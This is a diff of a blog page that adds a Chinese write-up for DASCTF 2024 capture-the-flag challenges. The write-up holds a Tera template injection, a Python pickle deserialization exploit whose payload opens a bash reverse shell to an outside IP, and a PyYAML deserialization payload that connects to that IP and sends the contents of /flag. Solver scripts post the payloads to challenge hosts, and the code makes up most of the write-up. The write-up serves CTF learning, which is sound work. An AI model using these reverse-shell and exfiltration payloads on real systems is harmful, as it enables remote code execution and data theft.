@@ -13,7 +13,7 @@
   
   <title>
     
-      DASCTF_2024最后一战 
+      DASCTF 2024最后一战 WP 
       
       
       |
@@ -156,16 +156,57 @@
   <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
   <div class="container post-details" id="post-details">
     <div class="post-content">
-      <div class="post-title">DASCTF_2024最后一战</div>
+      <div class="post-title">DASCTF 2024最后一战 WP</div>
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-          2024-12-21 20:12:53
+          2024-12-22 14:18:47
         </span>
         
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/CTF/" title="CTF">
+                    #CTF
+                  </a>
+                </span>
+                
+              </span>
+          
       </div>
       <div class="markdown-body">
-        
+        <h1 id="DASCTF-2024最后一战-WP"><a href="#DASCTF-2024最后一战-WP" class="headerlink" title="DASCTF 2024最后一战 WP"></a>DASCTF 2024最后一战 WP</h1><h1 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412211743277.png" alt="image-20241221165830870"></p>
+<h2 id="西湖论剑邀请函获取器"><a href="#西湖论剑邀请函获取器" class="headerlink" title="西湖论剑邀请函获取器"></a>西湖论剑邀请函获取器</h2><p>Tera模板注入，查看对应文档发现有个<code>get_env</code>函数</p>
+<p>很傻逼得设置默认值，不然一直给你报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; get_env(name=&quot;FLAG&quot;, default=&quot;das&quot;) &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="const-python"><a href="#const-python" class="headerlink" title="const_python"></a>const_python</h2><p>注意黑名单中ban的是<code>__builtin__</code>，所以<code>builtins</code>模块可用，exp如下</p>
+<p>payload生成，注意在Linux下运行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    		</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (builtins.<span class="built_in">__import__</span>(<span class="string">&quot;subprocess&quot;</span>).run, ([<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/111.229.217.82/6666 0&gt;&amp;1&quot;</span>],))		</span><br><span class="line">    		</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password, auth=<span class="string">&#x27;ctfer&#x27;</span></span>):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line">        self.auth = auth</span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;qwe123&quot;</span></span><br><span class="line">a = User(<span class="string">&#x27;admin&#x27;</span>, password, <span class="string">&quot;admin&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=pickle.dumps(a)</span><br><span class="line"></span><br><span class="line">payload=base64.b64encode(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+
+<p>发包</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8c73dbb1-4262-4365-bb07-10a0d3dde349.node5.buuoj.cn:81/&quot;</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;gASVWQAAAAAAAACMCnN1YnByb2Nlc3OUjANydW6Uk5RdlCiMBGJhc2iUjAItY5SMLGJhc2ggLWkgPiYgL2Rldi90Y3AvMTExLjIyOS4yMTcuODIvNjY2NiAwPiYxlGWFlFKULg==&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: payload</span><br><span class="line">&#125;</span><br><span class="line">resp = s.post(url+<span class="string">&quot;/ppicklee&quot;</span>, data)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412211743111.png" alt="image-20241221123932245"></p>
+<h2 id="yaml-matser"><a href="#yaml-matser" class="headerlink" title="yaml_matser"></a>yaml_matser</h2><p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12481?time__1311=GqGxRQqiuDyDlrzG78GOW=G==pxWwuepD#toc-6">https://xz.aliyun.com/t/12481?time__1311=GqGxRQqiuDyDlrzG78GOW%3DG%3D%3DpxWwuepD#toc-6</a></p>
+<p>发现没有ban new和exec，所以有如下payload了</p>
+<p>em以为不出网，然后想着打内存马，结果ban得很死。后面测试发现是出网的，脑洞大开发了个TCP包</p>
+<p>exp.yaml</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!python/object/new:type</span></span><br><span class="line">  <span class="attr">args:</span> [<span class="string">&quot;z&quot;</span>, <span class="type">!!python/tuple</span> [], &#123;<span class="attr">&quot;extend&quot;:</span> <span class="type">!!python/name:exec</span> &#125;]</span><br><span class="line">  <span class="attr">listitems:</span> <span class="string">__import__(&#x27;socket&#x27;).create_connection((&#x27;111.229.217.82&#x27;,</span> <span class="number">6666</span><span class="string">)).sendall((__import__(&#x27;io&#x27;).open(&#x27;/flag&#x27;,&#x27;rb&#x27;).read()))</span></span><br></pre></td></tr></table></figure>
+
+<p>发包</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># url = &quot;http://127.0.0.1:5000&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://node5.buuoj.cn:28158/&quot;</span></span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;exp.yaml&quot;</span></span><br><span class="line">filename = <span class="string">&quot;exp.yaml&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file=file_path, mode=<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: (filename, file)&#125;</span><br><span class="line">    response = requests.post(url + <span class="string">&quot;/upload&quot;</span>, files=files)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line">resp = requests.post(url + <span class="string">&quot;/Yam1?filename=exp&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure>
+
+<p>拿到flag</p>
+<p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412211743732.png" alt="2c9b2f94dfe72c4dbdc4bc66eef67edd"></p>
+
       </div>
       
         <div class="prev-or-next">
@@ -180,9 +221,20 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-              2024-12-21 20:12:53
+              2024-12-22 14:18:47
             </span>
             
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/CTF/" title="CTF">
+                        #CTF
+                      </a>
+                    </span>
+                    
+                  </span>
+              
           </div>
           <div class="post-foot-prev">
             
@@ -196,6 +248,23 @@
       
     </div>
     
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WP"><span class="toc-text">DASCTF 2024最后一战 WP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CheckIn"><span class="toc-text">CheckIn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-text">签到题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%82%80%E8%AF%B7%E5%87%BD%E8%8E%B7%E5%8F%96%E5%99%A8"><span class="toc-text">西湖论剑邀请函获取器</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#const-python"><span class="toc-text">const_python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#yaml-matser"><span class="toc-text">yaml_matser</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
 
     
       <div class="comments-container">
@@ -495,7 +564,7 @@
       </a>
       <div class="share-content hidden">
         
-          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + DASCTF_2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98 + '&url=' + http%3A%2F%2Fexample.com%2F2024%2F12%2F21%2FWriteUp%2FDASCTF-2024%25E6%259C%2580%25E5%2590%258E%25E4%25B8%2580%25E6%2588%2598%2F + '" target="_blank" title="Twitter">
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + DASCTF%202024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98%20WP + '&url=' + http%3A%2F%2Fexample.com%2F2024%2F12%2F21%2FWriteUp%2FDASCTF-2024%25E6%259C%2580%25E5%2590%258E%25E4%25B8%2580%25E6%2588%2598%2F + '" target="_blank" title="Twitter">
             <i class="iconfont icon-twitter"></i>
           </a>
         
